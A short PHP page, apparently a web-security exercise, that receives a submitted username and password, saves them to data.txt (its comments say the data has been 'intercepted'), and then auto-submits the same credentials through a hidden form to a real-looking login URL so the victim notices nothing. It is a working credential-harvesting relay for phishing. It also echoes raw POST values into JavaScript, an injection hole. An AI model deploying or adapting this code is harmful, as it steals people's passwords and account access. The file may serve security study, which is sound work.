<?php
	$name = '' ;
	$pwd  = '' ;
	//var_dump('数据被截取了',$_POST) ;
	if($_POST) {
		//记录获取的数据信息
		$name = $_POST['name'] ;
		$pwd = $_POST['pwd'] ;
		file_put_contents('data.txt', json_encode($_POST,true)) ;
	}
?>
<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>

</body>
<script type="text/javascript">
	window.onload = function (eve) {
		var name = '<?php echo $name; ?>' ;
		var pwd = '<?php echo $pwd; ?>' ;
		if(name && pwd) {
			var div = document.createElement('div');
			document.body.appendChild(div);
			div.innerHTML =' <form id="login2" method="post" action="http://base.com/Self/SomeSafety/WhiteHat/A-3-login.php" > '+
			    ' 用户姓名:<input type="text" name="name" value="'+name+'"> 用户密码:<input type="password" name="pwd" value="'+pwd+'"> '  ;
			document.getElementById('login2').submit();
		}
	}
</script>
</html>